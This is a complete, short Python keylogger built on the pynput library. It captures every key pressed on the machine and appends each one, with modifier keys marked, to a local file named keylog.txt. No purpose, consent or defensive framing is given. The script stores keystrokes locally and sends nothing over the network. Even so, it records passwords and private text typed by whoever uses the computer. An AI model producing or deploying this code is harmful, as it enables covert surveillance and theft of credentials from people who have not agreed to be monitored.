from pynput import keyboard

special_keys = ['Key.shift', 'Key.shift_r', 'Key.ctrl',
                'Key.ctrl_l', 'Key.ctrl_r', 'Key.alt', 'Key.alt_gr']

# Define the function to log keystrokes


def on_press(key):
    try:
        # Check if the pressed key is a special key
        if str(key) in special_keys:
            with open("keylog.txt", "a") as f:
                f.write(f"[Special Key: {key}]\n")
        else:
            with open("keylog.txt", "a") as f:
                f.write(f"{key}\n")
    except AttributeError:
        # Handle special keys like 'Shift', 'Ctrl', etc.
        with open("keylog.txt", "a") as f:
            f.write(f"[Special Key: {key}]\n")


# Start listening for key presses
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
